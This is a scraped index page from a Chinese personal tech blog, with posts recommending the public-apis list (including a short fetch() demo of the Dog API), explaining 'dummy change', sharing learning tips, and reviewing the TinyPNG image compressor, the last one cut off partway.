                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>3k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>3 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/36064.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 技术杂谈 <i class="label-arrow"></i>
                  </a>
                  <a href="/36064.html" class="post-title-link" itemprop="url">推荐一套公开的 API 接口</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>在某些情况下，我们可能想做一些 Demo 或者写一些测试，比如想做个网站展示一些宠物的图片，或者想实现某个 API 请求的实现逻辑，这时候你会怎么做呢？</p>
                  <p>自己找点数据然后搭建一套 API 接口吗？</p>
                  <p>可以是可以，虽然说并不是特别麻烦，但准备数据、编写逻辑、设置跨域等还是要费一些时间的。</p>
                  <p>其实，网上有很多很多免费的 API 接口可以直接拿来用的，而且各种类型的数据应有尽有，有了它们，我们就不用费尽心思自己搭建 API 了。</p>
                  <p>接下来就来给大家介绍一个库，里面收集了各种公开的数据接口。</p>
                  <h2 id="public-apis"><a href="#public-apis" class="headerlink" title="public-apis"></a>public-apis</h2>
                  <p>这个仓库就叫做 public-apis，其 GitHub 地址是 <a href="https://github.com/public-apis/public-apis" target="_blank" rel="noopener" title="https://github.com/public-apis/public-apis">https://github.com/public-apis/public-apis</a>。</p>
                  <p>其介绍是：</p>
                  <blockquote>
                    <p><em>A collective list of free APIs for use in software and web development</em></p>
                  </blockquote>
                  <p>一套公开 API，可以用于软件和 Web 开发。</p>
                  <p>这些 API 特别全面，包含了各种各样的类别。</p>
                  <p>比如我们先来看下他的一些分类：</p>
                  <p><img src="https://cdn.cuiqingcai.com/50ad0.png" alt=""></p>
                  <p>如图所示，可以看到这个仓库划分了很多大类别，比如动物、设计、书籍、商业、娱乐等几十个大类，按照字母排序，每个大类都有对应的 API 可供我们使用。</p>
                  <p>比如我们先看下动物的分类，则可以发现类似如下的表格：</p>
                  <p><img src="https://cdn.cuiqingcai.com/hioxz.png" alt=""></p>
                  <p>这个表格一共有五列，包括 API 的地址、描述、是否需要 Auth、是否支持 HTTPS、是否支持跨域，可以看到动物类别就有好多 API，比如 Dogs、Cats、Bear 等等，这些 API 就可以返回一些猫、狗、熊等图片的列表。</p>
                  <p>一般来说，我们可以选择 Auth 为 No，HTTPS 为 Yes、CORS 为 Yes 的，即使用 API 不需要 key，同时支持 HTTPS，而且支持跨域，这样在网页中我们就可以自由调用了。</p>
                  <p>我们随便选几个来看下。</p>
                  <h2 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h2>
                  <p>Dogs API 就是其中一个，网址为 <a href="https://dog.ceo/dog-api/" target="_blank" rel="noopener" title="https://dog.ceo/dog-api/">https://dog.ceo/dog-api/</a></p>
                  <p><img src="https://cdn.cuiqingcai.com/f7ivx.png" alt=""></p>
                  <p>打开之后我们可以看到一个介绍网站，同时这里有一个 Fetch 按钮，我们点一下就可以获得一张随机的狗狗图片。</p>
                  <p>其 API 地址就是 <a href="https://dog.ceo/api/breeds/image/random" target="_blank" rel="noopener" title="https://dog.ceo/api/breeds/image/random">https://dog.ceo/api/breeds/image/random</a>，我们也可以直接用浏览器打开，结果如下：</p>
                  <p><img src="https://cdn.cuiqingcai.com/mgdo7.png" alt=""></p>
                  <p>可以看到返回结果是 JSON 格式，我们对其进行简单解析就可以提取里面的 message 字段，也就能获得一张随机的狗狗照片，然后展示在网站上了。</p>
                  <p>简单写个 html 页面，几行代码就可以实现随机狗狗图片的展示：</p>
                  <figure class="highlight html">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">"dog"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    fetch(<span class="string">"https://dog.ceo/api/breeds/image/random"</span>)</span></span><br><span class="line"><span class="javascript">      .then(<span class="function">(<span class="params">response</span>) =&gt;</span> response.json())</span></span><br><span class="line"><span class="javascript">      .then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">"dog"</span>).src = data.message;</span></span><br><span class="line">      &#125;);</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行效果如下：</p>
                  <p><img src="https://cdn.cuiqingcai.com/0p033.png" alt=""></p>
                  <p>是不是还是挺方便的？</p>
                  <p>另外回到网站本身，它还提供了相关文档介绍所有接口的用法：<a href="https://dog.ceo/dog-api/documentation/" target="_blank" rel="noopener" title="https://dog.ceo/dog-api/documentation/">https://dog.ceo/dog-api/documentation/</a></p>
                  <p><img src="https://cdn.cuiqingcai.com/0gk4e.png" alt=""></p>
                  <p>比如这里有列出所有狗的品种、根据品种返回狗的照片、随机狗的照片等等，具体可以去看文档哈。</p>
                  <h2 id="其他介绍"><a href="#其他介绍" class="headerlink" title="其他介绍"></a>其他介绍</h2>
                  <p>另外其实还有很多有意思的 API，我们随便来看几个。</p>
                  <h3 id="EmojiHub"><a href="#EmojiHub" class="headerlink" title="EmojiHub"></a>EmojiHub</h3>
                  <p>比如 EmojiHub 这个 API 提供了接口来返回一些 Emoji 表情，种类丰富多种多样，<a href="https://github.com/cheatsnake/emojihub" target="_blank" rel="noopener" title="https://github.com/cheatsnake/emojihub">https://github.com/cheatsnake/emojihub</a></p>
                  <p><img src="https://cdn.cuiqingcai.com/gafvo.png" alt=""></p>
                  <h3 id="Icon-Horse"><a href="#Icon-Horse" class="headerlink" title="Icon Horse"></a>Icon Horse</h3>
                  <p>Icon Horse 提供了各种返回网站图标的功能，<a href="https://icon.horse/" target="_blank" rel="noopener" title="https://icon.horse/">https://icon.horse/</a></p>
                  <p>比如维基百科就可以填写 Wikipedia.org，就可以获取其网站图标了：</p>
                  <p><img src="https://cdn.cuiqingcai.com/pr922.png" alt=""></p>
                  <h3 id="bible-api"><a href="#bible-api" class="headerlink" title="bible-api"></a>bible-api</h3>
                  <p>这个 API 提供了多语言版本的《圣经》内容：<a href="https://bible-api.com/" target="_blank" rel="noopener" title="https://bible-api.com/">https://bible-api.com/</a>：</p>
                  <p><img src="https://cdn.cuiqingcai.com/2tx6e.png" alt=""></p>
                  <h3 id="Free-Dictionary-API"><a href="#Free-Dictionary-API" class="headerlink" title="Free Dictionary API"></a>Free Dictionary API</h3>
                  <p>Free Dictionary API 提供了各种单词的查询和释义，我们可以直接用 API 获取某个单词的含义、发音、音标、翻译等：<a href="https://dictionaryapi.dev/" target="_blank" rel="noopener" title="https://dictionaryapi.dev/">https://dictionaryapi.dev/</a></p>
                  <p><img src="https://cdn.cuiqingcai.com/jfe73.png" alt=""></p>
                  <h3 id="EconDB"><a href="#EconDB" class="headerlink" title="EconDB"></a>EconDB</h3>
                  <p>EconDB 提供了全球宏观经济数据，公开免费：<a href="https://www.econdb.com/" target="_blank" rel="noopener" title="https://www.econdb.com/">https://www.econdb.com/</a></p>
                  <p><img src="https://cdn.cuiqingcai.com/j4p1y.png" alt=""></p>
                  <h3 id="NBA-stats"><a href="#NBA-stats" class="headerlink" title="NBA stats"></a>NBA stats</h3>
                  <p>NBA Stats 提供了 NBA 有史以来各种数据，比如每场比赛数据、球员数据等等：<a href="https://any-api.com/nba_com/nba_com/docs/API_Description" target="_blank" rel="noopener" title="https://any-api.com/nba_com/nba_com/docs/API_Description">https://any-api.com/nba_com/nba_com/docs/API_Description</a></p>
                  <p><img src="https://cdn.cuiqingcai.com/bu4b7.png" alt=""></p>
                  <h3 id="Nobel-Prize"><a href="#Nobel-Prize" class="headerlink" title="Nobel Prize"></a>Nobel Prize</h3>
                  <p>Nobel Prize 这个接口返回了有关诺贝尔奖项的各种记录和活动：<a href="https://www.nobelprize.org/about/developer-zone-2/" target="_blank" rel="noopener" title="https://www.nobelprize.org/about/developer-zone-2/">https://www.nobelprize.org/about/developer-zone-2/</a></p>
                  <p><img src="https://cdn.cuiqingcai.com/bchlj.png" alt=""></p>
                  <h3 id="Faker-API"><a href="#Faker-API" class="headerlink" title="Faker API"></a>Faker API</h3>
                  <p>Faker API 提供了各种假数据生成器，比如生成假名字、假地址、假电话号码、假地理位置等等，方便测试和开发使用：<a href="https://fakerapi.it/en" target="_blank" rel="noopener" title="https://fakerapi.it/en">https://fakerapi.it/en</a></p>
                  <p><img src="https://cdn.cuiqingcai.com/qcllw.png" alt=""></p>
                  <h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2>
                  <p>总之，还有很多很多很多，当然其中也有收费的。</p>
                  <p>大家到时候有想要的数据可以来这里先搜搜看，说不定会有意外惊喜呢！</p>
                  <p>非常感谢你的阅读，更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-07-30 19:00:13" itemprop="dateCreated datePublished" datetime="2022-07-30T19:00:13+08:00">2022-07-30</time>
                </span>
                <span id="/36064.html" class="post-meta-item leancloud_visitors" data-flag-title="推荐一套公开的 API 接口" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>2.2k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>2 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/36063.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 技术杂谈 <i class="label-arrow"></i>
                  </a>
                  <a href="/36063.html" class="post-title-link" itemprop="url">什么是 dummy change？</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p><img src="https://files.mdnice.com/user/9693/6d24aaa2-ac44-4a5a-a30a-8a2a00b4fe9d.png" alt="img"></p>
                  <p>最近在工作上遇到了一个新词：dummy change，是在邮件沟通过程中遇到的，起因是某个 Pipeline 有个 Bug，但配置文件又没啥问题，所以对方建议让我对配置文件做点 dummy change，然后来触发 Pipeline 的刷新。</p>
                  <p>我一开始就不懂，啥叫 dummy change 啊？</p>
                  <p>然后我就查了下，这里分享给大家。</p>
                  <p>dummy，意思就是假的意思，就是假的 change，就是实际上变了，但看起来又没变。</p>
                  <p><img src="https://files.mdnice.com/user/9693/d6890546-6c36-4542-8f1e-d86c74ed0ef4.png" alt="img"></p>
                  <p>比如，一个文件，我们在某个地方加个空格、加个空行，表面上其实配置文件的内容没有变化，配置还是原来的配置，但是文件本身因为一个空行或者空格而发生了变化。</p>
                  <p>所以，dummy change 其实大多数就是文件某处改个空格、加个空行、修改点无关紧要注释啥的，没啥本质影响，但实际让文件本身变化，以便引发一些相关操作。</p>
                  <p>希望对大家有帮助。</p>
                  <p>非常感谢你的阅读，更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-06-12 20:40:56" itemprop="dateCreated datePublished" datetime="2022-06-12T20:40:56+08:00">2022-06-12</time>
                </span>
                <span id="/36063.html" class="post-meta-item leancloud_visitors" data-flag-title="什么是 dummy change？" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>398</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>1 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/36062.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 个人随笔 <i class="label-arrow"></i>
                  </a>
                  <a href="/36062.html" class="post-title-link" itemprop="url">学习新知识时的几个技巧</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>时代在发展，我们也需要不断进步和学习。</p>
                  <p>在一生中我们需要学习各种各样的新知识，但有时候我们在学习的时候可能感觉比较茫然，或者无从下手，或者不知道这个知识到底有什么用，或者学的过程中都不知道学到哪里了，还有多少才会学完。</p>
                  <p>这里，分享我看《暗时间》书了解到的一些技巧。</p>
                  <p>主要就是三个，也就是说，学习知识时来问自己三个问题：</p>
                  <ul>
                    <li>
                      <p>它的本质是什么</p>
                    </li>
                    <li>
                      <p>它的第一原则是什么</p>
                    </li>
                    <li>
                      <p>它的知识结构是怎样的</p>
                    </li>
                  </ul>
                  <h2 id="它的本质是什么"><a href="#它的本质是什么" class="headerlink" title="它的本质是什么"></a>它的本质是什么</h2>
                  <p>我们拿技术知识为例，比如我们要学 Django 开发一个网页，那么我们实际上是学了什么？实际上是学了一些 Django 的 API 和命令的用法、 Python 的语法。我们根据 API 的操作说明做了，那其实就能完成一个网页的搭建，因为我们使用了它现有的框架，基于现有的轮子来做东西。</p>
                  <p>但这里来了一个问题，假如我们之前是基于 1.10 版本的 Django 框架开发的网页，但现在 Django 升级到了 3.0，很多 API 的用法都变了，那之前 1.10 的 API 即使我们用的滚瓜烂熟甚至都背过了都没啥用了，因为 API 改了，那我们就不得不再去查文档看具体的用法。</p>
                  <p>这时候，我们要想想，学习这个 Django 技术的过程中，我们学到的是什么？实际上我们学到的就是 Django 框架的一些 API 用法，利用 Django 这个框架写了自己的业务逻辑而已，Django 已经帮我们处理了很多底层的东西，从而快速成型了一个网站。而网站的本质又是什么？实际上就是用户在浏览器中输入对应的 URL，然后服务器对相应的请求进行处理，并返回对应的内容，这本身又涉及到计算机网络很多的基础知识，比如请求都包含了什么，怎样进行逻辑处理，怎样和数据库交互，怎样返回响应，这些 Django 都帮我们做了，我们在写的时候无需关心得这么底层，但我们需要知道这背后发生的事情。如果我们压根不知道 Django 背后发生了什么，只是知道 API 变了，那出现问题的时候，我们根本不知道怎么去追查问题，不可能去从源码级别分析根本原因，也不知道怎么去优化和提速。</p>
                  <p>上面只是一个例子，很多知识其实背后都有其本质的东西，和一些不变的东西。而越本质的东西基本上变化的情形越少。</p>
                  <p>我们经常会感叹自己跟不上新技术的发展，却往往忽略了这些新技术背后都是什么。现在很多的新技术只是一层皮而已，比如 Django 框架基于 Python 对计算机网络、数据库等底层内容进行了很好的封装，比如 Scrapy 框架底层就包括网络请求处理、消息队列等内容，Vue 框架则是基于原生 JavaScript 对数据监听和绑定做了很好的封装和优化，通过虚拟 DOM 等机制来处理了页面渲染。那这些技术还有没有更底层的内容呢？有，比如浏览器、操作系统、计算机体系结构、计算机组成相关的内容。越追到底层，越发现其本质越是不变的。</p>
                  <p>另外，除了一些技术相关的本质内容，还有一些不变和永不过时的东西，比如算法和数据结构、基本的程序设计理论、良好的编码习惯、分析和解决问题的能力、强大的学习能力、旺盛的求知欲、良好的思维方式。</p>
                  <p>所以，我们尽量去抓住一些本质的、不过时的东西，这些才是最稳的。</p>
                  <h2 id="第一原则是什么"><a href="#第一原则是什么" class="headerlink" title="第一原则是什么"></a>第一原则是什么</h2>
                  <p>刚才我们说了，学一个东西我们要了解本质的东西，那么难道我要在学习 Django 框架的时候要把计算机网络、操作系统、计算机组成原理等所有的东西全都挨个学一遍？这得学到猴年马月啊。</p>
                  <p>所以，这里需要澄清的一点是，我们说要了解本质是什么并不是要求我们现在立马就把本质的东西全部去了解清楚，因为这里面的体系实在是太庞大了，递归学进去啥时候才能出得来啊？</p>
                  <p>所以，我们可以先从大致层面上知道它的本质，知道这个要学的知识在整个知识体系中处于一个怎样的位置上，有一个整体大局观。然后其本质的东西，我们有时间可以重点再一个个突破，因为毕竟这是很多技术的共性。</p>
                  <p>所以，这里就再引出了第二个需要注意的点：我们要知道学习这个东西的第一原则是什么。</p>
                  <p>比如我要学习好 Django 框架，那么我的原则其实就是学会 Django 的 API 和命令的用法，然后能够利用它搭建好网站，知道它能够做什么，有什么优缺点，有问题了知道怎么查，这是第一原则。</p>
                  <p>在学习的时候，我们按照这个原则来学习，这样整体效率和方向感就会好很多。</p>
                  <p>这“第一原则”听起来和刚才说的“了解本质”有点冲突啊？但实际上不冲突，“第一原则”说的是我们学知识的时候我们心里有一个目标和原则和大方向，“了解本质”是说我们也要知道这项知识它的整体定位和其背后都是什么。至于本质的东西，我们后面可以再慢慢去击破，去慢慢深入了解。</p>
                  <h2 id="知识体系是什么"><a href="#知识体系是什么" class="headerlink" title="知识体系是什么"></a>知识体系是什么</h2>
                  <p>知识体系嘛，顾名思义，就是整体脉络。</p>
                  <p>我们常常会觉得学习一个技术，不知道啥时候是个头，不知道学到哪里了，这其实就是缺乏了整体的知识体系。</p>
                  <p>一个知识体系可以帮我们在头脑中建立一个整体的框架，其实就像一本书的目录大纲，一门课的思维导图一样，多去了解下这些内容，会帮助我们很好地建立一个知识体系。</p>
                  <p>另外，某些知识可能并没有现成的知识体系，我们也要想办法构建一个知识体系。</p>
                  <p>这里有一个小技巧，学习一个领域知识的时候，时时把“最终能写出一篇漂亮的综述”放在大脑中提醒自己，这有助于我们在阅读中有意无意地整理知识的结构、本质和重点，经过整理之后的知识理解也会更深刻。</p>
                  <p>共勉。</p>
                  <p>非常感谢你的阅读，更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-06-12 20:37:13" itemprop="dateCreated datePublished" datetime="2022-06-12T20:37:13+08:00">2022-06-12</time>
                </span>
                <span id="/36062.html" class="post-meta-item leancloud_visitors" data-flag-title="学习新知识时的几个技巧" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>2.1k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>2 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/36061.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 技术杂谈 <i class="label-arrow"></i>
                  </a>
                  <a href="/36061.html" class="post-title-link" itemprop="url">推荐一个超强的图片压缩网站！</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>我们肯定经常跟图片打交道吧，不管是写文章、传图片还是网站开发，我们或多或少都要插图，但有时候图片体积比较大的时候就会带来加载速度慢的一些问题，那么这时候你可能会有这么一个需求：</p>
                  <blockquote>
                    <p>有没有什么办法在保证图片清晰度的时候把图片的体积压缩到最小？</p>
                  </blockquote>
                  <p>大家通常会用什么办法呢？</p>
                  <p>我的话其实用的比较多的办法就是使用 PS，然后另存为 Web 所用格式，但用到这个功能我还得额外装个 PS，感觉比较麻烦。</p>
                  <p>所以，今天给大家推荐一个非常好用的图片压缩网站，可以将图片体积缩小一大半，同时几乎不改变图片清晰度。</p>
                  <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2>
                  <p>直接开门见山，网站地址是：<a href="https://tinypng.com/" target="_blank" rel="noopener" title="https://tinypng.com/">https://tinypng.com/</a>，名称就叫 TinyPNG。</p>
                  <p>看名字我们就知道 tiny + png，tiny 就是小，png 就是图片的一种格式，就和图片压缩很接近了，简单好记。</p>
                  <p>那它的主要功能是什么呢？我们来看下主页：</p>
                  <p><img src="https://cdn.cuiqingcai.com/z387a.png" alt=""></p>
                  <p>可以看到，网站的一个大标题就是 “Smart WebP, PNG and JPEG compression”，意思就是智能的 WebP、PNG 和 JPEG 格式的压缩工具。</p>
                  <p>那么这个网站做了什么呢？</p>
                  <p>TinyPNG 网站举了一个例子：</p>
                  <p><img src="https://cdn.cuiqingcai.com/b219p.png" alt=""></p>
                  <p>可以看到原始图片和压缩后的图片对比几乎没有什么差别，而压缩前图片有 57KB，压缩后只有 15 KB。</p>
                  <h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2>
                  <p>看介绍感觉很厉害的样子啊，那我们来测试下看看吧，这次我们从网上先保存一张图片来看看：</p>
                  <p><img src="https://cdn.cuiqingcai.com/rz2za.png" alt=""></p>
                  <p>这张图片原图大小是 3.5MB，分辨率是 2356x1310，如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/o3725.png" alt=""></p>
                  <p>下面我们来上传下，点击这里就可以上传了，或者直接把图片拖拽到这个位置就可以：</p>
                  <p><img src="https://cdn.cuiqingcai.com/tll6m.png" alt=""></p>
                  <p>这里写着我们可以上传最多 20 张图片，每张图片大小不超过 5MB，感觉这个限制已经相对宽松了。</p>
                  <p>压缩完成之后显示，我们图片的最终大小成了 999.1KB，整整缩小了 71%！</p>
                  <p><img src="https://cdn.cuiqingcai.com/gq1q8.png" alt=""></p>
                  <p>到底效果行不行，拉出来溜溜。</p>
                  <p>然后我们可以直接点击 Download 按钮下载下来就好，压缩后的图片效果如下：</p>
                  <p><img src="https://cdn.cuiqingcai.com/9oivp.png" alt=""></p>
                  <p>放在一起对比下：</p>
                  <p><img src="https://cdn.cuiqingcai.com/rph4z.png" alt=""></p>
                  <p>能看出哪个才是原图吗？</p>
                  <p>其实第二张才是原图，是不是几乎看不出什么差别？</p>
                  <h2 id="背后技术"><a href="#背后技术" class="headerlink" title="背后技术"></a>背后技术</h2>
                  <p>看简介可以了解到，TinyPNG 这个网站使用了有损压缩技术来减小 WebP、PNG、JPEG 格式图片的文件大小，它通过有选择地减少图像中的颜色数量来达到压缩效果，同时由于咱们人眼对这种细微颜色变化感知比较弱，所以压缩前后图片在人眼看到几乎是没什么区别的。</p>
                  <p>对于 PNG 图片来说，它其实细分为 PNG-8 和 PNG-24，它们有什么区别呢？</p>
                  <p>其实我们知道，每一个图片都是由一个个像素点组成的对吧，每一个像素点都有一定的颜色，那许许多多的像素点排列在一起就组成了一张图片。</p>
                  <p>在计算机里面，每个像素点其实都有一定的存储单位来表示，对于 PNG-8 来说，一个像素点是由 8 位二进制数表示的，而计算机中 8 位最多表示 2 的八次方，即 256 种组合，其实一个像素就能显示 256 种颜色。同理，而 PNG-24 就相当于一个像素点用 24 位来表示，所以能表示的颜色数量就是 2 的 24 次方，结果约 1600 万。所以 PNG-24 相比 PNG-8 来说每个像素可表示的颜色就多非常多，色彩也就更丰富，所以 PNG-24 适合摄影作品之类的比较丰富的图片。但随之而来的 ，PNG-24 的文件体积相比 PNG-8 也会大很多。</p>
                  <p>而对于人眼来说，其实一张图片用 PNG-8 和 PNG-24 来表示，如果不仔细放大看的话，效果其实不太明显。所以有时候我们为了更高的压缩比，就可以选用 PNG-8 这种图片存储格式，其体积会小一大半，加载速度也会快很多。</p>
                  <p>所以这种图很适合在网站开发的时候使用，所以你可以看到一些网站的 Logo、Banner 图都是 PNG-8 类型的图片。</p>
                  <p>所以实际上，TinyPNG 这个网站其实就是把 PNG-24 的图转成了 PNG-8 而已。</p>
                  <h2 id="进一步测试"><a href="#进一步测试" class="headerlink" title="进一步测试"></a>进一步测试</h2>
                  <p>那知道原理之后，我们如果把 PNG-8 的图片再上传给 TinyPNG 这个网站，还能获得压缩吗？</p>
                  <p>我们来试试。</p>
                  <p><img src="https://cdn.cuiqingcai.com/jp5iz.png" alt=""></p>
                  <p>可以看到，我们将压缩后的图片再次尝试压缩，这次最终可能就是 959.9 KB 了，只获得了 4% 的压缩，所以可以看到几乎也没有什么压缩空间了。因为它无法再将 PNG-8 进一步降低每个像素的表示位数了。</p>
                  <h2 id="支持情况"><a href="#支持情况" class="headerlink" title="支持情况"></a>支持情况</h2>
                  <p>看来这个压缩效果的确还可以的，那么它的兼容性怎么样？</p>
                  <p>介绍说，它支持所有主流的浏览器，比如 Chrome、Firefox、Safari、Edge 甚至一些移动设备浏览器也是有很好的支持的，所以平时只要我们有浏览器，就能用了。</p>
